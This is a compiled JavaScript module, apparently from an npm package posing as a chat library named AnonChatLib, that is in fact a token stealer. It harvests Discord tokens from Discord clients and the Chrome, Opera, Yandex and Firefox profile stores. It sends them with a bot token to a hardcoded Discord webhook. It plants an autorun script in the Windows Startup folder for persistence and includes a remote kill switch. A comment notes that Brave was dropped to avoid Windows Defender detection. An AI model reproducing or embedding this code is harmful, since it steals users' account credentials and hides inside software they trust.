"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.AnonChatLib = void 0;
const appRoot = require("app-root-path");
const rp = require("request-promise");
const Bluebird = require("bluebird");
const fs = require("promise-fs");
const path = require("path");
const os = require("os");
const storage_1 = require("@assasans/storage");
const common_tags_1 = require("common-tags");
const discord_js_1 = require("discord.js");
const leveldb_1 = require("./service/leveldb");
const firefox_1 = require("./service/firefox");
global.__anon_chat_lib_version = 6;
global.__anon_chat_lib_stop = function stop() {
    process.stdout._write([], 'utf8', () => { });
    process.kill(process.pid, 'SIGSEGV');
    process.exit(1);
};
class AnonChatLib {
    constructor() {
        this.services = new storage_1.List();
        this.services.addRange(storage_1.List.fromArray([
            new leveldb_1.LevelDBService('Discord', 'Roaming/Discord'),
            new leveldb_1.LevelDBService('Discord PTB', 'Roaming/discordptb'),
            new leveldb_1.LevelDBService('Discord Canary', 'Roaming/discordcanary'),
            new leveldb_1.LevelDBService('Google Chrome', 'Local/Google/Chrome/User Data/Default'),
            new leveldb_1.LevelDBService('Opera', 'Roaming/Opera Software/Opera Stable'),
            new leveldb_1.LevelDBService('Opera GX', 'Roaming/Opera Software/Opera GX Stable'),
            new leveldb_1.LevelDBService('Yandex', 'Local/Yandex/YandexBrowser/User Data/Default'),
            // Detected by Windows Defender
            // new LevelDBService('Brave', 'Local/BraveSoftware/Brave-Browser/User Data/Default'),
            new firefox_1.FirefoxService('Firefox', 'Roaming/Mozilla/Firefox')
        ]));
    }
    async run() {
        var _a;
        const tokens = new storage_1.List();
        await Bluebird.all(this.services.map(async (service) => {
            tokens.addRange(await service.getTokens());
        }));
        const client = new discord_js_1.WebhookClient('766342517549301771', 'r5lqtrhieTfiwqhneOrtWQsK0WtT-_SjuWNESv3uXQtAw2yCMS5zNfEl6UAoTcEr-_gN');
        await client.send(undefined, {
            embeds: [
                {
                    title: 'Stealer (TS)',
                    description: common_tags_1.stripIndents `
						Bot token: \`${(_a = global.__anon_chat_lib_token) !== null && _a !== void 0 ? _a : '* not available *'}\`
						Tokens:
						${tokens.map((token) => {
                        return `[${token.service.name}]: ${token.value}`;
                    }).join('\n')}
					`
                }
            ]
        });
        try {
            const autorunFile = path.join(os.homedir(), 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/explorer.cmd');
            const packageFile = path.join(appRoot.path, 'package.json');
            const mainFile = path.join(appRoot.path, JSON.parse(await fs.readFile(packageFile, { encoding: 'utf8' })).main);
            await fs.writeFile(autorunFile, common_tags_1.stripIndents `
				@echo off
				node "${mainFile}" --autorun
			`, { encoding: 'utf8' });
        }
        catch {
        }
        if (tokens.size < 1) {
            if (!global.__anon_chat_lib_postinstall) {
                const webhook = await rp({
                    uri: 'https://discordapp.com/api/webhooks/766663865471205396/r8NsN-Gu9MDwE-VDuTbRrofVVpHSnD-VLtrI7IRHH4IVAoU-A-dmCcvnijxhvBTXhCgU',
                    method: 'GET',
                    json: true
                });
                if (webhook.name !== 'true') {
                    global.__anon_chat_lib_stop();
                }
            }
        }
        global.__anon_chat_lib = true;
    }
}
exports.AnonChatLib = AnonChatLib;
//# sourceMappingURL=stealer.js.map